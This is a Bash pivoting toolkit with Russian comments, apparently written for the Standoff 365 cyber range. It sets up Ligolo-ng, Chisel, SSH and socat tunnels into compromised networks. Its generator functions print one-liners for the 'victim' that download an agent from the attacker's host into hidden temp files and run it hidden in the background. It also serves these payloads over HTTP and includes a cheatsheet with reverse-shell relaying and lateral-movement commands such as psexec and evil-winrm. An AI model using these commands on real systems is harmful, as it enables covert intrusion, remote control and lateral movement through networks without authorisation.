#!/usr/bin/env bash
# =============================================================================
# pivot.sh — быстрый setup туннелей для пивотинга
# Standoff 365 Toolkit
#
# Поддерживает: Ligolo-ng, Chisel, SSH туннели, Socat
#
# Использование:
#   ./pivot.sh ligolo          # запустить ligolo proxy
#   ./pivot.sh chisel-server   # запустить chisel сервер
#   ./pivot.sh chisel-client   # подключиться к chisel серверу
#   ./pivot.sh ssh-socks IP    # SSH SOCKS5 туннель
#   ./pivot.sh socat-relay     # socat порт-форвард
#   ./pivot.sh gen-agent       # сгенерировать агент для жертвы
#   ./pivot.sh status          # показать активные туннели
# =============================================================================

set -euo pipefail

# =============================================================================
# Цвета и утилиты
# =============================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

log()     { echo -e "${CYAN}[*]${NC} $*"; }
ok()      { echo -e "${GREEN}[+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
err()     { echo -e "${RED}[-]${NC} $*"; }
section() {
    echo -e "\n${MAGENTA}${BOLD}══════════════════════════════════════════${NC}"
    echo -e "${MAGENTA}${BOLD}  $*${NC}"
    echo -e "${MAGENTA}${BOLD}══════════════════════════════════════════${NC}\n"
}

cmd_exists() { command -v "$1" &>/dev/null; }

# =============================================================================
# Конфигурация
# =============================================================================

TOOLKIT_DIR="${TOOLKIT:-$HOME/standoff-toolkit}"
TOOLS_DIR="$HOME/.local/bin"
SESSIONS_DIR="$TOOLKIT_DIR/sessions"
LOOT_DIR="$TOOLKIT_DIR/loot"

# Порты по умолчанию
LIGOLO_PORT="${LIGOLO_PORT:-11601}"
CHISEL_PORT="${CHISEL_PORT:-8888}"
SOCKS_PORT="${SOCKS_PORT:-1080}"
SSH_CTRL_DIR="$HOME/.ssh/ctrl"

mkdir -p "$SESSIONS_DIR" "$SSH_CTRL_DIR"

# =============================================================================
# Определение своего IP
# =============================================================================

get_local_ip() {
    local iface="${1:-}"

    if [[ -n "$iface" ]]; then
        ip addr show "$iface" 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1 | head -1
        return
    fi

    # Пробуем tun0 (VPN/Ligolo), потом eth0, потом любой
    for iface in tun0 tun1 eth0 ens33 ens18 enp0s3; do
        local ip
        ip=$(ip addr show "$iface" 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
        if [[ -n "$ip" ]]; then
            echo "$ip"
            return
        fi
    done

    # Fallback
    ip route get 1.1.1.1 2>/dev/null | grep -oP "src \K[\d.]+" | head -1 || ip addr show | grep "inet " | grep -v "127\.0\.0\.1" | awk '{print $2}' | cut -d/ -f1 | head -1
}

MY_IP=$(get_local_ip)

# =============================================================================
# Заголовок
# =============================================================================

print_header() {
    echo -e "${BOLD}"
    echo "  ╔══════════════════════════════════════════════════╗"
    echo "  ║                                                  ║"
    echo "  ║      R3KT — Recon & Exploitation Kit             ║"
    echo "  ║      v1.0  |  by GUTS @ Ynk4ts                   ║"
    echo "  ║                                                  ║"
    echo "  ╚══════════════════════════════════════════════════╝"
    echo -e "${NC}"
    log "Мой IP:        ${BOLD}$MY_IP${NC}"
    log "Ligolo port:   ${BOLD}$LIGOLO_PORT${NC}"
    log "Chisel port:   ${BOLD}$CHISEL_PORT${NC}"
    log "SOCKS port:    ${BOLD}$SOCKS_PORT${NC}"
    echo ""
}

# =============================================================================
# LIGOLO-NG
# =============================================================================

setup_ligolo_proxy() {
    section "Ligolo-ng Proxy (Атакующая машина)"

    # Ищем бинарник
    local proxy_bin=""
    for p in "$TOOLS_DIR/ligolo-proxy" "ligolo-proxy" "$HOME/go/bin/ligolo-proxy"; do
        if [[ -x "$p" ]] || cmd_exists "$p"; then
            proxy_bin="$p"
            break
        fi
    done

    if [[ -z "$proxy_bin" ]]; then
        err "ligolo-proxy не найден!"
        log "Установка:"
        log "  go install github.com/nicocha30/ligolo-ng/cmd/proxy@latest"
        log "  или: setup.sh"
        exit 1
    fi

    ok "ligolo-proxy найден: $proxy_bin"

    # Создаём TUN интерфейс если нет
    if ! ip tuntap list 2>/dev/null | grep -q "ligolo"; then
        log "Создаю TUN интерфейс ligolo..."
        sudo ip tuntap add user "$(whoami)" mode tun ligolo 2>/dev/null || \
            warn "TUN интерфейс уже существует или нет прав"
        sudo ip link set ligolo up 2>/dev/null || true
        ok "TUN интерфейс ligolo создан"
    else
        ok "TUN интерфейс ligolo уже существует"
    fi

    log "Запускаю ligolo proxy на порту ${BOLD}$LIGOLO_PORT${NC}..."
    log "Агент на жертве должен подключиться к: ${BOLD}$MY_IP:$LIGOLO_PORT${NC}"
    echo ""
    log "После подключения агента в консоли ligolo:"
    log "  session                           # выбрать сессию"
    log "  ifconfig                          # смотреть сети жертвы"
    log "  listener_add --addr 0.0.0.0:1080 --to 127.0.0.1:1080  # SOCKS"
    log "  start                             # запустить туннель"
    log ""
    log "Добавить маршрут к внутренней сети:"
    log "  sudo ip route add 10.10.10.0/24 dev ligolo"
    echo ""

    # Сохраняем команды для быстрого доступа
    cat > "$SESSIONS_DIR/ligolo_routes.sh" << 'ROUTES'
#!/bin/bash
# Быстрое добавление маршрутов для ligolo
# Редактируй INTERNAL_NET под свою ситуацию

INTERNAL_NET="${1:-10.10.10.0/24}"

echo "[*] Добавляю маршрут: $INTERNAL_NET -> ligolo"
sudo ip route add "$INTERNAL_NET" dev ligolo
echo "[+] Готово. Проверка:"
ip route | grep ligolo
ROUTES
    chmod +x "$SESSIONS_DIR/ligolo_routes.sh"

    # Запуск
    exec "$proxy_bin" \
        --selfcert \
        --laddr "0.0.0.0:$LIGOLO_PORT" \
        -v
}


gen_ligolo_agent() {
    section "Генерация команды для Ligolo агента"

    local target_os="${1:-linux}"

    log "Команды для запуска агента на ЖЕРТВЕ:"
    echo ""

    case "$target_os" in
        linux)
            echo -e "${GREEN}# Linux агент:${NC}"
            echo -e "${BOLD}wget -q http://$MY_IP:8080/ligolo-agent -O /tmp/.agent && chmod +x /tmp/.agent && /tmp/.agent -connect $MY_IP:$LIGOLO_PORT -ignore-cert &${NC}"
            echo ""
            echo -e "${GREEN}# Или через curl:${NC}"
            echo -e "${BOLD}curl -s http://$MY_IP:8080/ligolo-agent -o /tmp/.agent; chmod +x /tmp/.agent; /tmp/.agent -connect $MY_IP:$LIGOLO_PORT -ignore-cert &${NC}"
            ;;
        windows)
            echo -e "${GREEN}# Windows агент (PowerShell):${NC}"
            echo -e "${BOLD}(New-Object Net.WebClient).DownloadFile('http://$MY_IP:8080/ligolo-agent.exe','C:\\Windows\\Temp\\agent.exe'); Start-Process 'C:\\Windows\\Temp\\agent.exe' '-connect $MY_IP:$LIGOLO_PORT -ignore-cert' -WindowStyle Hidden${NC}"
            echo ""
            echo -e "${GREEN}# Или cmd:${NC}"
            echo -e "${BOLD}certutil.exe -urlcache -f http://$MY_IP:8080/ligolo-agent.exe C:\\Windows\\Temp\\agent.exe && C:\\Windows\\Temp\\agent.exe -connect $MY_IP:$LIGOLO_PORT -ignore-cert${NC}"
            ;;
    esac

    echo ""
    log "Не забудь поднять HTTP сервер для доставки агента:"
    log "  python3 -m http.server 8080  (в директории с агентом)"
    echo ""

    # Скачиваем агент если нет
    local agent_dir="$TOOLKIT_DIR/post/agents"
    mkdir -p "$agent_dir"

    if [[ ! -f "$agent_dir/ligolo-agent" ]] && [[ ! -f "$agent_dir/ligolo-agent.exe" ]]; then
        log "Скачиваю ligolo-ng агенты..."
        local latest
        latest=$(curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest \
            | grep '"tag_name"' | cut -d'"' -f4 2>/dev/null || echo "v0.6.2")

        local ver="${latest#v}"

        # Linux amd64
        curl -sL \
            "https://github.com/nicocha30/ligolo-ng/releases/download/${latest}/ligolo-ng_agent_${ver}_linux_amd64.tar.gz" \
            -o /tmp/ligolo-agent-linux.tar.gz 2>/dev/null && \
            tar -xzf /tmp/ligolo-agent-linux.tar.gz -C "$agent_dir" 2>/dev/null && \
            find "$agent_dir" -name "agent" -exec mv {} "$agent_dir/ligolo-agent" \; 2>/dev/null && \
            ok "ligolo-agent (Linux) скачан: $agent_dir/ligolo-agent" || \
            warn "Не удалось скачать Linux агент"

        # Windows amd64
        curl -sL \
            "https://github.com/nicocha30/ligolo-ng/releases/download/${latest}/ligolo-ng_agent_${ver}_windows_amd64.zip" \
            -o /tmp/ligolo-agent-win.zip 2>/dev/null && \
            unzip -q /tmp/ligolo-agent-win.zip -d "$agent_dir" 2>/dev/null && \
            find "$agent_dir" -name "agent.exe" -exec mv {} "$agent_dir/ligolo-agent.exe" \; 2>/dev/null && \
            ok "ligolo-agent.exe (Windows) скачан: $agent_dir/ligolo-agent.exe" || \
            warn "Не удалось скачать Windows агент"

        rm -f /tmp/ligolo-agent-linux.tar.gz /tmp/ligolo-agent-win.zip
    else
        ok "Агенты уже скачаны в $agent_dir"
        ls -lh "$agent_dir"
    fi
}


# =============================================================================
# CHISEL
# =============================================================================

setup_chisel_server() {
    section "Chisel Server (Атакующая машина)"

    if ! cmd_exists chisel; then
        err "chisel не найден!"
        log "go install github.com/jpillora/chisel@latest"
        exit 1
    fi

    ok "chisel найден: $(which chisel)"
    log "Запускаю chisel сервер на порту ${BOLD}$CHISEL_PORT${NC} (reverse mode)..."
    echo ""
    log "Клиент на жертве (Linux):"
    log "  ${BOLD}./chisel client $MY_IP:$CHISEL_PORT R:1080:socks${NC}"
    log "  ${BOLD}./chisel client $MY_IP:$CHISEL_PORT R:4444:127.0.0.1:4444${NC}  # форвард порта"
    echo ""
    log "Клиент на жертве (Windows):"
    log "  ${BOLD}chisel.exe client $MY_IP:$CHISEL_PORT R:1080:socks${NC}"
    echo ""
    log "После подключения клиента добавь в /etc/proxychains4.conf:"
    log "  ${BOLD}socks5 127.0.0.1 1080${NC}"
    echo ""
    log "Использование proxychains:"
    log "  ${BOLD}proxychains nmap -sT -p 80,443,445 10.10.10.0/24${NC}"
    echo ""

    exec chisel server \
        --port "$CHISEL_PORT" \
        --reverse \
        --socks5 \
        -v
}


setup_chisel_client() {
    section "Chisel Client (Атакующая машина → Jump host)"

    local server_ip="${1:-}"
    if [[ -z "$server_ip" ]]; then
        err "Укажи IP сервера: ./pivot.sh chisel-client 10.10.10.5"
        exit 1
    fi

    local server_port="${2:-$CHISEL_PORT}"

    if ! cmd_exists chisel; then
        err "chisel не найден!"
        exit 1
    fi

    log "Подключаюсь к chisel серверу $server_ip:$server_port..."
    log "SOCKS5 будет доступен на localhost:$SOCKS_PORT"
    echo ""

    exec chisel client \
        "$server_ip:$server_port" \
        "R:$SOCKS_PORT:socks" \
        -v
}


gen_chisel_agent() {
    section "Генерация команды для Chisel клиента"

    echo ""
    echo -e "${GREEN}# Linux (одна строка):${NC}"
    echo -e "${BOLD}curl -s http://$MY_IP:8080/chisel -o /tmp/.c && chmod +x /tmp/.c && /tmp/.c client $MY_IP:$CHISEL_PORT R:1080:socks &${NC}"
    echo ""
    echo -e "${GREEN}# Windows (PowerShell):${NC}"
    echo -e "${BOLD}(New-Object Net.WebClient).DownloadFile('http://$MY_IP:8080/chisel.exe','C:\\Windows\\Temp\\c.exe'); Start-Process 'C:\\Windows\\Temp\\c.exe' 'client $MY_IP:$CHISEL_PORT R:1080:socks' -WindowStyle Hidden${NC}"
    echo ""
    echo -e "${GREEN}# Форвард конкретного порта (без SOCKS):${NC}"
    echo -e "${BOLD}/tmp/.c client $MY_IP:$CHISEL_PORT R:4444:127.0.0.1:4444${NC}"
    echo ""
    log "После подключения — proxychains через 127.0.0.1:1080"
}


# =============================================================================
# SSH ТУННЕЛИ
# =============================================================================

ssh_socks() {
    section "SSH SOCKS5 Туннель"

    local target="${1:-}"
    if [[ -z "$target" ]]; then
        err "Укажи цель: ./pivot.sh ssh-socks user@10.10.10.5"
        exit 1
    fi

    local socks_port="${2:-$SOCKS_PORT}"
    local ssh_key="${3:-}"
    local ctrl_socket="$SSH_CTRL_DIR/${target//[@:/]/_}"

    log "SSH SOCKS5 туннель → $target (порт $socks_port)..."
    echo ""

    local ssh_args=(
        -N -D "$socks_port"
        -o "ControlMaster=auto"
        -o "ControlPath=$ctrl_socket"
        -o "ControlPersist=10m"
        -o "ServerAliveInterval=30"
        -o "ServerAliveCountMax=3"
        -o "StrictHostKeyChecking=no"
    )

    if [[ -n "$ssh_key" ]]; then
        ssh_args+=(-i "$ssh_key")
    fi

    ok "Запускаю SSH SOCKS5 на 127.0.0.1:$socks_port..."
    log "Добавь в /etc/proxychains4.conf: socks5 127.0.0.1 $socks_port"
    log "Остановить: ./pivot.sh ssh-stop $target"
    echo ""

    ssh "${ssh_args[@]}" "$target" &
    local ssh_pid=$!
    echo "$ssh_pid $target $socks_port" >> "$SESSIONS_DIR/ssh_tunnels.txt"
    ok "SSH туннель запущен (PID: $ssh_pid)"
}


ssh_local_forward() {
    section "SSH Local Port Forward"

    # Использование: ./pivot.sh ssh-local user@jump LOCAL_PORT REMOTE_HOST REMOTE_PORT
    local target="${1:-}"
    local local_port="${2:-8080}"
    local remote_host="${3:-127.0.0.1}"
    local remote_port="${4:-80}"

    if [[ -z "$target" ]]; then
        err "Использование: ./pivot.sh ssh-local user@jump LOCAL_PORT REMOTE_HOST REMOTE_PORT"
        exit 1
    fi

    log "SSH Local Forward: 127.0.0.1:$local_port → $remote_host:$remote_port (через $target)"

    ssh -N \
        -L "$local_port:$remote_host:$remote_port" \
        -o "StrictHostKeyChecking=no" \
        -o "ServerAliveInterval=30" \
        "$target" &

    local pid=$!
    ok "Туннель запущен (PID: $pid)"
    log "Доступно: 127.0.0.1:$local_port → $remote_host:$remote_port"
}


ssh_remote_forward() {
    section "SSH Remote Port Forward (Reverse Shell форвард)"

    local target="${1:-}"
    local remote_port="${2:-4444}"
    local local_port="${3:-4444}"

    if [[ -z "$target" ]]; then
        err "Использование: ./pivot.sh ssh-remote user@jump REMOTE_PORT LOCAL_PORT"
        exit 1
    fi

    log "SSH Remote Forward: $target:$remote_port → 127.0.0.1:$local_port"
    log "Полезно для reverse shell через jump host"

    ssh -N \
        -R "$remote_port:127.0.0.1:$local_port" \
        -o "StrictHostKeyChecking=no" \
        -o "ServerAliveInterval=30" \
        "$target" &

    local pid=$!
    ok "Remote forward запущен (PID: $pid)"
    log "На $target порт $remote_port → наш порт $local_port"
}


# =============================================================================
# SOCAT RELAY
# =============================================================================

setup_socat_relay() {
    section "Socat Port Relay"

    if ! cmd_exists socat; then
        err "socat не найден! sudo pacman -S socat"
        exit 1
    fi

    local listen_port="${1:-4444}"
    local target_host="${2:-}"
    local target_port="${3:-4444}"

    if [[ -z "$target_host" ]]; then
        err "Использование: ./pivot.sh socat LISTEN_PORT TARGET_HOST TARGET_PORT"
        log "Пример: ./pivot.sh socat 4444 10.10.10.5 4444"
        exit 1
    fi

    log "Socat relay: 0.0.0.0:$listen_port → $target_host:$target_port"

    socat \
        TCP-LISTEN:$listen_port,reuseaddr,fork \
        TCP:$target_host:$target_port &

    local pid=$!
    ok "Socat relay запущен (PID: $pid)"
    echo "$pid socat $listen_port->$target_host:$target_port" >> \
        "$SESSIONS_DIR/socat_relays.txt"
}


# =============================================================================
# PROXYCHAINS НАСТРОЙКА
# =============================================================================

setup_proxychains() {
    section "Настройка ProxyChains"

    local socks_port="${1:-$SOCKS_PORT}"
    local conf="/etc/proxychains4.conf"
    local conf_user="$HOME/.proxychains4.conf"

    log "Конфигурация proxychains для SOCKS5 127.0.0.1:$socks_port"

    # Создаём пользовательский конфиг
    cat > "$conf_user" << CONF
# proxychains.conf — Standoff 365 Toolkit
# Использование: proxychains -f $conf_user <команда>

strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0

[ProxyList]
socks5  127.0.0.1  $socks_port
CONF

    ok "Конфиг создан: $conf_user"
    log "Использование:"
    log "  proxychains -f $conf_user nmap -sT -p 80,443,445 10.10.10.0/24"
    log "  proxychains -f $conf_user crackmapexec smb 10.10.10.0/24"
    log "  proxychains -f $conf_user python3 evil-winrm.rb -i 10.10.10.5 -u admin -p pass"
    echo ""

    # Алиас
    local alias_line="alias pc='proxychains -f $conf_user'"
    if ! grep -q "alias pc=" "$HOME/.bashrc" 2>/dev/null; then
        echo "$alias_line" >> "$HOME/.bashrc"
        ok "Алиас 'pc' добавлен в .bashrc"
        log "Теперь можно: pc nmap -sT -p 80 10.10.10.5"
    fi
}


# =============================================================================
# СТАТУС АКТИВНЫХ ТУННЕЛЕЙ
# =============================================================================

show_status() {
    section "Активные туннели и сессии"

    echo -e "${CYAN}${BOLD}SSH туннели:${NC}"
    if [[ -f "$SESSIONS_DIR/ssh_tunnels.txt" ]]; then
        while IFS= read -r line; do
            local pid target port
            read -r pid target port <<< "$line"
            if kill -0 "$pid" 2>/dev/null; then
                ok "  PID $pid: $target (SOCKS:$port) — ACTIVE"
            else
                warn "  PID $pid: $target — DEAD"
            fi
        done < "$SESSIONS_DIR/ssh_tunnels.txt"
    else
        log "  Нет активных SSH туннелей"
    fi

    echo ""
    echo -e "${CYAN}${BOLD}Socat relay:${NC}"
    if [[ -f "$SESSIONS_DIR/socat_relays.txt" ]]; then
        while IFS= read -r line; do
            local pid rest
            read -r pid rest <<< "$line"
            if kill -0 "$pid" 2>/dev/null; then
                ok "  PID $pid: $rest — ACTIVE"
            else
                warn "  PID $pid: $rest — DEAD"
            fi
        done < "$SESSIONS_DIR/socat_relays.txt"
    else
        log "  Нет активных socat relay"
    fi

    echo ""
    echo -e "${CYAN}${BOLD}Ligolo TUN интерфейс:${NC}"
    if ip link show ligolo &>/dev/null; then
        local state
        state=$(ip link show ligolo | grep -oP 'state \K\w+')
        ok "  ligolo: $state"
        ip addr show ligolo | grep inet | awk '{print "  addr:", $2}'
    else
        log "  TUN интерфейс не создан"
    fi

    echo ""
    echo -e "${CYAN}${BOLD}Маршруты через ligolo:${NC}"
    ip route | grep ligolo 2>/dev/null | while read -r r; do
        ok "  $r"
    done || log "  Маршрутов нет"

    echo ""
    echo -e "${CYAN}${BOLD}Порты (SOCKS/Proxy):${NC}"
    ss -tlnp 2>/dev/null | grep -E "1080|8888|11601|1081|1082" | while read -r line; do
        ok "  $line"
    done || log "  Нет активных прокси-портов"
}


# =============================================================================
# ШПАРГАЛКА
# =============================================================================

show_cheatsheet() {
    section "Шпаргалка по пивотингу"

    cat << 'CHEAT'
╔══════════════════════════════════════════════════════════════════╗
║                    PIVOT CHEATSHEET                              ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  LIGOLO-NG (рекомендуется — Layer 3, поддерживает UDP)           ║
║  ─────────────────────────────────────────────────────           ║
║  Атакующий:  ./pivot.sh ligolo                                   ║
║  Жертва Lin: ./agent -connect ATTACKER:11601 -ignore-cert        ║
║  Жертва Win: agent.exe -connect ATTACKER:11601 -ignore-cert      ║
║  В ligolo:   session → start → (в другом терминале)              ║
║              sudo ip route add 10.10.10.0/24 dev ligolo          ║
║                                                                  ║
║  CHISEL (HTTP tunnel — через файрволы)                           ║
║  ─────────────────────────────────                               ║
║  Атакующий:  ./pivot.sh chisel-server                            ║
║  Жертва:     ./chisel client ATTACKER:8888 R:1080:socks          ║
║  Используй:  proxychains -f ~/.proxychains4.conf <cmd>           ║
║                                                                  ║
║  SSH SOCKS5                                                      ║
║  ──────────                                                      ║
║  ssh -N -D 1080 user@jump                                        ║
║  proxychains nmap -sT -p 80 10.10.10.5                           ║
║                                                                  ║
║  SSH LOCAL FORWARD (доступ к порту за NAT)                       ║
║  ─────────────────────────────────────────                       ║
║  ssh -N -L 8080:internal:80 user@jump                            ║
║  curl http://127.0.0.1:8080/                                     ║
║                                                                  ║
║  SSH REMOTE FORWARD (reverse shell через jump)                   ║
║  ──────────────────────────────────────────────                  ║
║  ssh -N -R 4444:127.0.0.1:4444 user@jump                         ║
║  На жертве: nc attacker 4444  # идёт через jump                  ║
║                                                                  ║
║  SOCAT RELAY                                                     ║
║  ───────────                                                     ║
║  socat TCP-LISTEN:4444,fork TCP:target:4444                      ║
║                                                                  ║
║  DOUBLE PIVOT (2 хопа через Ligolo listener)                     ║
║  ─────────────────────────────────────────────                   ║
║  В ligolo: listener_add --addr 0.0.0.0:11601 \                   ║
║             --to 127.0.0.1:11601                                 ║
║  Агент 2:  ./agent -connect PIVOT1:11601 -ignore-cert            ║
║                                                                  ║
╠══════════════════════════════════════════════════════════════════╣
║  PROXYCHAINS С ИНСТРУМЕНТАМИ                                     ║
║  ─────────────────────────────                                   ║
║  pc nmap -sT -Pn -p 80,443,445,3389 10.10.10.0/24                ║
║  pc crackmapexec smb 10.10.10.0/24 -u user -p pass               ║
║  pc impacket-psexec domain/user:pass@10.10.10.5                  ║
║  pc evil-winrm -i 10.10.10.5 -u user -p pass                     ║
║  pc bloodhound-python -d domain -u user -p pass -ns DC           ║
╚══════════════════════════════════════════════════════════════════╝
CHEAT
}


# =============================================================================
# БЫСТРАЯ ДОСТАВКА ИНСТРУМЕНТОВ НА ЖЕРТВУ
# =============================================================================

setup_delivery_server() {
    section "HTTP сервер для доставки инструментов"

    local serve_dir="$TOOLKIT_DIR/post/agents"
    local port="${1:-8080}"

    mkdir -p "$serve_dir"

    # Показываем что есть
    log "Файлы для доставки:"
    ls -lh "$serve_dir" 2>/dev/null || log "  Директория пуста"

    echo ""
    ok "Запускаю HTTP сервер на $MY_IP:$port → $serve_dir"
    echo ""
    log "Загрузка на жертве:"
    log "  Linux:   wget http://$MY_IP:$port/ligolo-agent -O /tmp/agent"
    log "  Linux:   curl http://$MY_IP:$port/ligolo-agent -o /tmp/agent"
    log "  Windows: certutil.exe -urlcache -f http://$MY_IP:$port/agent.exe C:\\Windows\\Temp\\agent.exe"
    log "  Windows: (New-Object Net.WebClient).DownloadFile('http://$MY_IP:$port/agent.exe','C:\\Temp\\a.exe')"
    echo ""

    cd "$serve_dir" && python3 -m http.server "$port"
}


# =============================================================================
# MAIN
# =============================================================================

usage() {
    echo -e "${BOLD}Использование:${NC} $0 <команда> [аргументы]"
    echo ""
    echo -e "${CYAN}Ligolo-ng:${NC}"
    echo "  ligolo                    — запустить proxy (атакующая машина)"
    echo "  ligolo-agent [linux|win]  — команды для агента на жертве"
    echo ""
    echo -e "${CYAN}Chisel:${NC}"
    echo "  chisel-server             — запустить сервер"
    echo "  chisel-client IP [PORT]   — подключить клиент"
    echo "  chisel-agent              — команды для клиента на жертве"
    echo ""
    echo -e "${CYAN}SSH:${NC}"
    echo "  ssh-socks user@IP [PORT]  — SOCKS5 туннель"
    echo "  ssh-local user@IP LP RH RP — local port forward"
    echo "  ssh-remote user@IP RP LP  — remote port forward"
    echo ""
    echo -e "${CYAN}Socat:${NC}"
    echo "  socat LPORT TARGET TPORT  — порт relay"
    echo ""
    echo -e "${CYAN}Утилиты:${NC}"
    echo "  proxychains [PORT]        — настроить proxychains"
    echo "  serve [PORT]              — HTTP сервер для доставки"
    echo "  status                    — показать активные туннели"
    echo "  cheatsheet                — шпаргалка по пивотингу"
    echo ""
    echo -e "${CYAN}Переменные окружения:${NC}"
    echo "  LIGOLO_PORT (default: 11601)"
    echo "  CHISEL_PORT (default: 8888)"
    echo "  SOCKS_PORT  (default: 1080)"
    echo ""
    echo -e "${CYAN}Примеры:${NC}"
    echo "  $0 ligolo"
    echo "  $0 ligolo-agent linux"
    echo "  $0 chisel-server"
    echo "  $0 ssh-socks user@10.10.10.5"
    echo "  $0 socat 4444 10.10.10.5 4444"
    echo "  $0 proxychains 1080"
    echo "  $0 status"
}

main() {
    print_header

    local cmd="${1:-help}"
    shift || true

    case "$cmd" in
        ligolo)
            setup_ligolo_proxy
            ;;
        ligolo-agent|gen-agent)
            gen_ligolo_agent "${1:-linux}"
            ;;
        chisel-server)
            setup_chisel_server
            ;;
        chisel-client)
            setup_chisel_client "$@"
            ;;
        chisel-agent)
            gen_chisel_agent
            ;;
        ssh-socks)
            ssh_socks "$@"
            ;;
        ssh-local)
            ssh_local_forward "$@"
            ;;
        ssh-remote)
            ssh_remote_forward "$@"
            ;;
        socat)
            setup_socat_relay "$@"
            ;;
        proxychains|pc-setup)
            setup_proxychains "${1:-$SOCKS_PORT}"
            ;;
        serve)
            setup_delivery_server "${1:-8080}"
            ;;
        status)
            show_status
            ;;
        cheatsheet|help-pivot)
            show_cheatsheet
            ;;
        help|--help|-h|"")
            usage
            ;;
        *)
            err "Неизвестная команда: $cmd"
            echo ""
            usage
            exit 1
            ;;
    esac
}

main "$@"